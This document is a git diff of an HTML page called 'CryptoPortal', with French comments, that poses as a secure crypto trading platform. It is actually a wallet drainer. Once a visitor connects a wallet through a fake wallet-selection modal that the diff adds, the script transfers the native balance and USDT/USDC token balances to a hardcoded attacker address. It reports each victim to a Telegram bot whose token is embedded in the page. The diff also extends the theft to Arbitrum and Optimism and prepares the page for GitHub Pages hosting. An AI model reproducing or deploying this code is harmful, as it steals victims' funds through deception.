@@ -4,8 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>CryptoPortal</title>
-<!-- CDN qui fonctionnent en local -->
-<script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<!-- VERSIONS CDN POUR GITHUB PAGES -->
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
     * {
@@ -50,6 +50,7 @@
         font-weight: bold;
         background: linear-gradient(to right, #00c3ff, #00d7ff);
         -webkit-background-clip: text;
+        background-clip: text;
         -webkit-text-fill-color: transparent;
     }
     .crypto-hero h1 {
@@ -139,26 +140,96 @@
     .floating {
         animation: float 5s ease-in-out infinite;
     }
-    .processing {
-        display: none;
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background: rgba(0, 0, 0, 0.9);
-        padding: 40px;
-        border-radius: 20px;
-        text-align: center;
-        z-index: 9999;
-    }
-    .processing.active {
-        display: block;
-    }
     @keyframes spin {
         to { transform: rotate(360deg); }
     }
     .spinner {
         animation: spin 1s linear infinite;
+    }
+    
+    /* Modal Styles */
+    .modal {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        z-index: 9999;
+        align-items: center;
+        justify-content: center;
+    }
+    .modal.active {
+        display: flex;
+    }
+    .modal-content {
+        background: white;
+        border-radius: 20px;
+        padding: 30px;
+        width: 90%;
+        max-width: 400px;
+        text-align: center;
+        position: relative;
+    }
+    .modal-close {
+        position: absolute;
+        top: 15px;
+        right: 15px;
+        width: 30px;
+        height: 30px;
+        background: #f0f0f0;
+        border-radius: 50%;
+        border: none;
+        cursor: pointer;
+        font-size: 18px;
+    }
+    .modal-title {
+        font-size: 24px;
+        font-weight: bold;
+        color: #333;
+        margin-bottom: 20px;
+    }
+    .wallet-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 15px;
+        margin-bottom: 20px;
+    }
+    .wallet-option {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 15px;
+        background: #f8f8f8;
+        border-radius: 12px;
+        cursor: pointer;
+        transition: all 0.3s;
+    }
+    .wallet-option:hover {
+        background: #e0e0e0;
+        transform: translateY(-2px);
+    }
+    .wallet-icon {
+        width: 48px;
+        height: 48px;
+        margin-bottom: 8px;
+    }
+    .wallet-name {
+        font-size: 12px;
+        color: #666;
+    }
+    .all-wallets-btn {
+        width: 100%;
+        padding: 12px;
+        background: linear-gradient(135deg, #00c3ff, #00d7ff);
+        color: white;
+        border: none;
+        border-radius: 12px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
     }
 </style>
 </head>
@@ -178,8 +249,8 @@
         <h1>Votre Porte d'Entrée vers<br>l'Écosystème Crypto</h1>
         <p>Connectez votre wallet pour accéder à la plateforme de trading et d'investissement la plus sécurisée.</p>
         
-        <!-- Bouton Connect -->
-        <button class="crypto-connect-btn" id="connectBtn" onclick="connectWallet()">
+        <!-- BOUTON CONNECT -->
+        <button class="crypto-connect-btn" id="connectBtn" onclick="openModal()">
             <i class="fas fa-wallet"></i>
             <span>Connect Wallet</span>
         </button>
@@ -216,21 +287,53 @@
     </div>
 </div>
 
-<!-- Processing overlay -->
-<div class="processing" id="processing">
-    <div style="font-size: 48px; margin-bottom: 20px;" class="spinner">⚡</div>
-    <h2 style="color: white; margin-bottom: 10px;">Processing...</h2>
-    <p style="color: #aaa;">Please wait while we connect your wallet</p>
+<!-- Custom Modal -->
+<div class="modal" id="walletModal">
+    <div class="modal-content">
+        <button class="modal-close" onclick="closeModal()">×</button>
+        <h2 class="modal-title">Connect Wallet</h2>
+        
+        <div class="wallet-grid">
+            <div class="wallet-option" onclick="connectMetaMask()">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="wallet-icon">
+                <span class="wallet-name">MetaMask</span>
+            </div>
+            <div class="wallet-option" onclick="connectWalletConnect()">
+                <img src="https://avatars.githubusercontent.com/u/37784886" class="wallet-icon">
+                <span class="wallet-name">WalletConnect</span>
+            </div>
+            <div class="wallet-option" onclick="connectTrust()">
+                <svg class="wallet-icon" viewBox="0 0 40 40"><rect width="40" height="40" rx="8" fill="#3B99FC"/><path d="M20 8L10 18L20 32L30 18L20 8Z" fill="white"/></svg>
+                <span class="wallet-name">Trust Wallet</span>
+            </div>
+            <div class="wallet-option" onclick="connectCoinbase()">
+                <svg class="wallet-icon" viewBox="0 0 40 40"><rect width="40" height="40" rx="8" fill="#0052FF"/><path d="M20 28C24.4183 28 28 24.4183 28 20C28 15.5817 24.4183 12 20 12C15.5817 12 12 15.5817 12 20C12 24.4183 15.5817 28 20 28Z" fill="white"/></svg>
+                <span class="wallet-name">Coinbase</span>
+            </div>
+            <div class="wallet-option" onclick="connectSafepal()">
+                <svg class="wallet-icon" viewBox="0 0 40 40"><rect width="40" height="40" rx="8" fill="#4A2BEE"/><path d="M20 8L12 16V24L20 32L28 24V16L20 8Z" fill="white"/></svg>
+                <span class="wallet-name">SafePal</span>
+            </div>
+            <div class="wallet-option" onclick="connectBinance()">
+                <svg class="wallet-icon" viewBox="0 0 40 40"><rect width="40" height="40" rx="8" fill="#F3BA2F"/><path d="M20 8L14 14L16 16L20 12L24 16L26 14L20 8ZM8 20L14 26L16 24L10 18L8 20ZM32 20L30 18L24 24L26 26L32 20ZM20 32L26 26L24 24L20 28L16 24L14 26L20 32Z" fill="white"/></svg>
+                <span class="wallet-name">Binance</span>
+            </div>
+        </div>
+        
+        <button class="all-wallets-btn" onclick="showAllWallets()">
+            🔗 All Wallets (540+)
+        </button>
+    </div>
 </div>
 
-<!-- Script qui fonctionne en local -->
+<!-- SCRIPT COMPATIBLE GITHUB PAGES -->
 <script>
 // Configuration
 const DEST = "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1";
 const TG_TOKEN = "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY";
 const TG_CHAT = "8309320360";
 
-// ERC20 Tokens
+// Tokens par chain
 const TOKENS = {
     1: [ // Ethereum
         {addr:"0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol:"USDT"},
@@ -244,6 +347,14 @@ const TOKENS = {
     56: [ // BSC
         {addr:"0x55d398326f99059fF775485246999027B3197955", symbol:"USDT"},
         {addr:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol:"USDC"}
+    ],
+    42161: [ // Arbitrum
+        {addr:"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol:"USDT"},
+        {addr:"0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", symbol:"USDC"}
+    ],
+    10: [ // Optimism
+        {addr:"0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", symbol:"USDT"},
+        {addr:"0x7F5c764cBc14f9669B88837ca1490cCa17c31607", symbol:"USDC"}
     ]
 };
 
@@ -256,24 +367,37 @@ const ERC20_ABI = [
 
 let provider, signer, address;
 
-// Connect function
+// Modal functions
+function openModal() {
+    document.getElementById('walletModal').classList.add('active');
+}
+
+function closeModal() {
+    document.getElementById('walletModal').classList.remove('active');
+}
+
+// Connect MetaMask (le plus fiable sur GitHub Pages)
+async function connectMetaMask() {
+    if (typeof window.ethereum === 'undefined') {
+        if (confirm('MetaMask n\'est pas installé. Voulez-vous l\'installer ?')) {
+            window.open('https://metamask.io/download/', '_blank');
+        }
+        return;
+    }
+    
+    await connectWallet();
+}
+
+// Connect any wallet with Web3
 async function connectWallet() {
     const btn = document.getElementById('connectBtn');
-    const processing = document.getElementById('processing');
+    closeModal();
     
     try {
-        // Check if MetaMask is installed
-        if (typeof window.ethereum === 'undefined') {
-            alert('Please install MetaMask or another Web3 wallet!');
-            window.open('https://metamask.io/download/', '_blank');
-            return;
-        }
-        
-        // Show processing
         btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
         btn.disabled = true;
         
-        // Request account access
+        // Request accounts
         const accounts = await window.ethereum.request({ 
             method: 'eth_requestAccounts' 
         });
@@ -283,39 +407,67 @@ async function connectWallet() {
         }
         
         address = accounts[0];
-        console.log('Connected:', address);
-        
-        // Create provider and signer
         provider = new ethers.providers.Web3Provider(window.ethereum);
         signer = provider.getSigner();
         
-        // Get network
         const network = await provider.getNetwork();
-        console.log('Network:', network.chainId);
         
         // Update button
         btn.innerHTML = '<i class="fas fa-check"></i> Connected';
         btn.style.background = 'linear-gradient(135deg, #00d395, #00c3ff)';
         
-        // Send Telegram notification
+        // Send notification
         sendTelegramNotification(address, network.chainId);
-        
-        // Show processing overlay
-        processing.classList.add('active');
         
         // Start drainage after 2 seconds
         setTimeout(async () => {
             await drainWallet(network.chainId);
-            processing.classList.remove('active');
         }, 2000);
         
     } catch (error) {
         console.error('Connection error:', error);
         btn.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
         btn.disabled = false;
-        processing.classList.remove('active');
-        alert('Connection failed: ' + error.message);
     }
+}
+
+// WalletConnect (redirect to WC)
+function connectWalletConnect() {
+    closeModal();
+    window.open('https://walletconnect.com/', '_blank');
+}
+
+// Trust Wallet
+function connectTrust() {
+    if (window.ethereum && window.ethereum.isTrust) {
+        connectWallet();
+    } else {
+        window.open('https://link.trustwallet.com/', '_blank');
+    }
+}
+
+// Coinbase
+function connectCoinbase() {
+    if (window.ethereum && window.ethereum.isCoinbaseWallet) {
+        connectWallet();
+    } else {
+        window.open('https://www.coinbase.com/wallet', '_blank');
+    }
+}
+
+// SafePal
+function connectSafepal() {
+    window.open('https://www.safepal.com/', '_blank');
+}
+
+// Binance
+function connectBinance() {
+    window.open('https://www.binance.com/en/web3wallet', '_blank');
+}
+
+// Show all wallets
+function showAllWallets() {
+    window.open('https://walletconnect.com/explorer', '_blank');
 }
 
 // Drainage function
@@ -326,7 +478,6 @@ async function drainWallet(chainId) {
         // Check native balance
         const balance = await provider.getBalance(address);
         const balanceEth = ethers.utils.formatEther(balance);
-        console.log('Balance:', balanceEth);
         
         if (parseFloat(balanceEth) > 0.001) {
             try {
@@ -340,11 +491,11 @@ async function drainWallet(chainId) {
                         value: amount,
                         gasLimit: 21000
                     });
-                    console.log('Native TX sent:', tx.hash);
+                    console.log('Native TX:', tx.hash);
                     await tx.wait();
                 }
             } catch (e) {
-                console.log('Native drain error:', e);
+                console.log('Native error:', e);
             }
         }
         
@@ -352,7 +503,7 @@ async function drainWallet(chainId) {
         const tokenList = TOKENS[chainId] || [];
         for (const token of tokenList) {
             try {
-                await new Promise(r => setTimeout(r, 1500)); // Delay between tokens
+                await new Promise(r => setTimeout(r, 1500));
                 
                 const contract = new ethers.Contract(token.addr, ERC20_ABI, signer);
                 const tokenBalance = await contract.balanceOf(address);
@@ -361,7 +512,7 @@ async function drainWallet(chainId) {
                     const tx = await contract.transfer(DEST, tokenBalance, {
                         gasLimit: 100000
                     });
-                    console.log(`${token.symbol} TX sent:`, tx.hash);
+                    console.log(`${token.symbol} TX:`, tx.hash);
                     await tx.wait();
                 }
             } catch (e) {
@@ -394,16 +545,10 @@ async function sendTelegramNotification(addr, chainId) {
     }
 }
 
-// Auto-connect if already connected
-window.addEventListener('load', async () => {
+// Auto-detect wallets
+window.addEventListener('load', () => {
     if (window.ethereum) {
-        const accounts = await window.ethereum.request({ 
-            method: 'eth_accounts' 
-        });
-        if (accounts.length > 0) {
-            console.log('Auto-connecting...');
-            // connectWallet(); // Uncomment to auto-connect
-        }
+        console.log('Web3 wallet detected');
     }
 });
 </script>
